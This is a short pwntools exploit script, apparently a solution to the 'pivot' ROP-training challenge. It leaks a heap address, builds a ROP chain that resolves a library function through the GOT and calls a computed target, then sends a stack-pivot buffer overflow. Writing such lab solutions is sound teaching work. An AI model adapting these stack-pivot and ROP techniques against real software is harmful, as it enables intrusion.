from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./pivot')
elf = ELF('./pivot')

p.recvuntil('pivot: ')
a1 = int(p.recvuntil('\n'), 16)
print hex(a1)

foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']
pop_rax_ret = 0x400b00
mov_rax_rax = 0x400b05
pop_rbp_ret = 0x400900
add_rax_rbp = 0x400b09
call_rax = 0x40098e

payload = flat([foothold_plt, pop_rax_ret, foothold_got, mov_rax_rax, pop_rbp_ret, 0x14e, add_rax_rbp, call_rax])

p.recvuntil('>')
p.sendline(payload)

xchg_rax_rsp = 0x400b02
payload = flat(['a'*0x28, pop_rax_ret, a1, xchg_rax_rsp])

p.recvuntil('>')
p.sendline(payload)

p.interactive()